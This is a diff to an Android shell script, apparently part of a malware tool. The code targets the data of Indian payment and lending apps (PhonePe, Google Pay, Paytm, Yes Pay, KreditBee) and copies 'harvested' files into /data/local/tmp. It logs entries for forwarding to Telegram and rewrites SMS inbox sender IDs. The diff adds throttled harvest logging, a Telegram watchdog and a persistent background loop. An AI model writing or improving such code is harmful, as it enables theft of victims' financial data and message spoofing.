@@ -93,9 +93,16 @@ hivirtus_harvest_saves() {
     fi
   done
   if [ -n "$found" ]; then
+    OLD_MT=$(stat -c %Y /data/local/tmp/hivirtus_ui_save.json 2>/dev/null || echo 0)
     cp -f "$found" /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
-    echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    NEW_MT=$(stat -c %Y "$found" 2>/dev/null || echo 0)
+    LAST_H=$(cat /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null || echo 0)
+    NOW=$(date +%s)
+    if [ "$NEW_MT" != "$OLD_MT" ] || [ $((NOW - LAST_H)) -ge 30 ]; then
+      echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      echo "$NOW" > /data/local/tmp/hivirtus_harvest_log.ts
+    fi
   fi
   for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android; do
     for f in \
@@ -562,8 +569,15 @@ rewrite_inbox_sender_id() {
     send_tg_test_if_requested
     forward_blocked_telegram
     rewrite_inbox_sender_id
-    hivirtus_seed_app_writable_files 2>/dev/null
-    sleep 1
+    hivirtus_tg_watchdog 2>/dev/null
+    sleep 2
+  done
+) &
+
+(
+  while true; do
+    sleep 45
+    hivirtus_seed_app_writable_files quiet 2>/dev/null
   done
 ) &
 
